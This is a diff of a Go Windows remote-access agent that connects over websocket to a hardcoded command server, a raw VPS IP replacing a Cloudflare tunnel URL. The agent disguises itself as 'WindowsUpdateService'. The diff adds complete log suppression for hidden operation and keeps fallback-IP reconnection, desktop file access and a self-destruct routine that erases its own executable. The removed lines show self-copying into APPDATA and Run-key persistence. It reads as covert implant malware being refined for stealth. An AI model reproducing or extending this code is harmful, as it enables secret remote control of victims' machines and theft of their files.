@@ -23,25 +23,19 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
-// ==================== HARDCODED SERVER URL ====================
-// CHANGE THIS BEFORE BUILDING
-const DefaultServerURL = "wss://resorts-jets-supplement-knock.trycloudflare.com/agent"
-
+// ==================== HARDCODED VPS IP ====================
+const DefaultServerURL = "ws://206.189.131.112:8080/agent"
 // ==============================================================
 
+// ==================== PORTABLE CONFIGURATION ====================
 const (
-	appName    = "WindowsGraphicsDriver"
-	installRel = "WindowsGraphicsDriver\\agent.exe"
-	configRel  = "WindowsGraphicsDriver\\config.json"
-	logRel     = "WindowsGraphicsDriver\\agent.log"
+	appName    = "WindowsUpdateService"
+	configFile = "config.json"
 )
 
 var (
-	appData     = os.Getenv("APPDATA")
-	installDir  = filepath.Join(appData, "WindowsGraphicsDriver")
-	exePath     = filepath.Join(installDir, "agent.exe")
-	configPath  = filepath.Join(installDir, "config.json")
-	logPath     = filepath.Join(installDir, "agent.log")
+	exeDir, _   = filepath.Abs(filepath.Dir(os.Args[0]))
+	configPath  = filepath.Join(exeDir, configFile)
 	desktopRoot = filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
 )
 
@@ -78,92 +72,25 @@ type uploadSession struct {
 
 var uploadSessions sync.Map
 
+// ========== MAIN ==========
 func main() {
-	if !isInstalled() {
-		if err := install(); err != nil {
-			fmt.Fprintf(os.Stderr, "Install failed: %v\n", err)
-			os.Exit(1)
-		}
-		startInstalledAndExit()
-		return
-	}
+	// Discard all logging – no log file, no console (since -H windowsgui hides it)
+	log.SetOutput(io.Discard)
+
 	if err := runAgent(); err != nil {
-		log.Printf("Agent error: %v", err)
 		os.Exit(1)
 	}
 }
 
-func isInstalled() bool {
-	exe, _ := os.Executable()
-	absExe, _ := filepath.Abs(exe)
-	absTarget, _ := filepath.Abs(exePath)
-	return strings.EqualFold(absExe, absTarget)
-}
-
-func install() error {
-	if err := os.MkdirAll(installDir, 0755); err != nil {
-		return err
-	}
-	self, err := os.Executable()
+// ========== AGENT LOOP ==========
+func runAgent() error {
+	cfg, err := loadConfig()
 	if err != nil {
-		return err
-	}
-	selfFile, err := os.Open(self)
-	if err != nil {
-		return err
-	}
-	defer selfFile.Close()
-	destFile, err := os.Create(exePath)
-	if err != nil {
-		return err
-	}
-	defer destFile.Close()
-	if _, err := io.Copy(destFile, selfFile); err != nil {
-		return err
-	}
-	if _, err := os.Stat(configPath); os.IsNotExist(err) {
-		defaultCfg := Config{
+		cfg = Config{
 			Token:            "",
 			ReconnectDelayMs: 5000,
 			FallbackIPs:      []string{},
 		}
-		data, _ := json.MarshalIndent(defaultCfg, "", "  ")
-		if err := os.WriteFile(configPath, data, 0644); err != nil {
-			return err
-		}
-	}
-	key, err := registry.OpenKey(registry.CURRENT_USER,
-		`Software\Microsoft\Windows\CurrentVersion\Run`,
-		registry.SET_VALUE)
-	if err != nil {
-		return err
-	}
-	defer key.Close()
-	if err := key.SetStringValue(appName, exePath); err != nil {
-		return err
-	}
-	return nil
-}
-
-func startInstalledAndExit() {
-	cmd := exec.Command(exePath)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	cmd.Start()
-	os.Exit(0)
-}
-
-func runAgent() error {
-	logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
-	if err != nil {
-		return err
-	}
-	defer logFile.Close()
-	log.SetOutput(logFile)
-	log.SetFlags(log.LstdFlags | log.Lshortfile)
-
-	cfg, err := loadConfig()
-	if err != nil {
-		return err
 	}
 	if cfg.ReconnectDelayMs == 0 {
 		cfg.ReconnectDelayMs = 5000
@@ -171,8 +98,9 @@ func runAgent() error {
 
 	ctx := context.Background()
 	for {
-		err := connectWithFallback(ctx, cfg)
-		log.Printf("Connection lost: %v, reconnecting in %d ms", err, cfg.ReconnectDelayMs)
+		// Ignore error – we just retry
+		_ = connectWithFallback(ctx, cfg)
+
 		select {
 		case <-time.After(time.Duration(cfg.ReconnectDelayMs) * time.Millisecond):
 		case <-ctx.Done():
@@ -295,14 +223,8 @@ func tryConnect(ctx context.Context, urlStr, token string) error {
 	}
 
 	if ips, err := resolveHostToIPs(urlStr); err == nil && len(ips) > 0 {
-		if err := updateFallbackIPs(ips); err != nil {
-			log.Printf("Warning: failed to update fallback IPs: %v", err)
-		} else {
-			log.Printf("Stored fallback IPs: %v", ips)
-		}
+		_ = updateFallbackIPs(ips)
 	}
-
-	log.Printf("Connected to %s", urlStr)
 
 	go func() {
 		ticker := time.NewTicker(30 * time.Second)
@@ -326,7 +248,6 @@ func tryConnect(ctx context.Context, urlStr, token string) error {
 		}
 		var req Request
 		if err := json.Unmarshal(msg, &req); err != nil {
-			log.Printf("Invalid JSON: %v", err)
 			continue
 		}
 		go handleRequest(ctx, conn, req)
@@ -339,16 +260,12 @@ func connectWithFallback(ctx context.Context, cfg Config) error {
 	if err == nil {
 		return nil
 	}
-	log.Printf("Primary connection failed: %v, trying fallback IPs", err)
-
 	for _, ip := range cfg.FallbackIPs {
 		fallbackURL := rewriteHost(primaryURL, ip)
 		err := tryConnect(ctx, fallbackURL, cfg.Token)
 		if err == nil {
-			log.Printf("Connected via fallback IP: %s", ip)
 			return nil
 		}
-		log.Printf("Fallback IP %s failed: %v", ip, err)
 	}
 	return fmt.Errorf("all connection attempts failed")
 }
@@ -669,17 +586,11 @@ func handleUploadChunk(conn *websocket.Conn, req Request) {
 
 // ========== SELF DESTRUCT ==========
 func handleSelfDestruct(conn *websocket.Conn, req Request) {
-	// Remove registry key
-	key, err := registry.OpenKey(registry.CURRENT_USER,
-		`Software\Microsoft\Windows\CurrentVersion\Run`,
-		registry.SET_VALUE)
-	if err == nil {
-		key.DeleteValue(appName)
-		key.Close()
-		log.Println("Registry key deleted")
-	}
+	// Delete config
+	os.Remove(configPath)
 
-	// Create batch file to delete the exe after process exit
+	// Delete the EXE itself
+	exePath, _ := os.Executable()
 	batPath := filepath.Join(os.TempDir(), "selfdestruct.bat")
 	batContent := fmt.Sprintf(`@echo off
 timeout /t 2 /nobreak > nul
@@ -692,15 +603,14 @@ del /f /q "%%~f0"
 		cmd.Start()
 	}
 
-	// Send response
 	sendResponse(conn, req.RequestId, map[string]interface{}{
 		"ok":      true,
 		"message": "Self-destruct initiated",
 	})
 
-	// Exit after short delay
 	go func() {
 		time.Sleep(500 * time.Millisecond)
 		os.Exit(0)
 	}()
 }
+
